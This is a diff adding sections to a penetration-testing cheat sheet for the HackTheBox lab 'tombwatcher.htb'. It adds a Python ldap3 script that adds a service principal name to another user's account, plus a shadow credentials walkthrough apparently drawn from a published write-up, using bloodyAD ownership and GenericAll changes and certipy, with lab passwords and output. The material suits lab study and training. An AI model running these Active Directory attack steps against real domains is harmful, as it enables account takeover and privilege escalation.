@@ -1165,3 +1165,59 @@ socks5 127.0.0.1 58080
 ```
 
 Ensure this entry is in `/etc/proxychains4.conf`
+
+***
+
+## ADD SPN WITH PYTHON
+
+```python
+from ldap3 import Server, Connection, NTLM, MODIFY_ADD
+
+dc_ip = '10.10.11.72'
+domain = 'tombwatcher.htb'
+username = 'henry'
+password = 'H3nry_987TGV!'
+target_user = 'alfred'  # Utilisateur cible sur lequel tu as WriteSPN
+spn_value = 'HTTP/custom.tombwatcher.htb'
+
+server = Server(dc_ip)
+conn = Connection(server, user=f'{domain}\\{username}', password=password, authentication=NTLM, auto_bind=True)
+
+# Cherche DN de l'utilisateur cible
+conn.search('dc=tombwatcher,dc=htb', f'(sAMAccountName={target_user})', attributes=['distinguishedName'])
+target_dn = conn.entries[0].distinguishedName.value
+
+# Ajoute un SPN personnalisé
+conn.modify(target_dn, {'servicePrincipalName': [(MODIFY_ADD, [spn_value])]})
+
+if conn.result['result'] == 0:
+    print(f'[+] SPN ajouté avec succès : {spn_value}')
+else:
+    print(f'[-] Échec ajout SPN : {conn.result}')
+
+```
+
+***
+
+## <mark style="color:red;">SHADOW CREDENTIALS ATTACK</mark>
+
+I’ll start by setting the owner of John to Sam with `bloodyAD`:
+
+```
+oxdf@hacky$ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb set owner john sam
+[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
+```
+
+Next I’ll give Sam `GenericAll` over John:
+
+```
+oxdf@hacky$ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb add genericAll john sam
+[+] sam has now GenericAll on john
+```
+
+Now `certipy` will do the shadow credential attack:
+
+```
+oxdf@hacky$ certipy shadow auto -target dc01.tombwatcher.htb -u sam -p '0xdf0xdf!' -account john
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+```
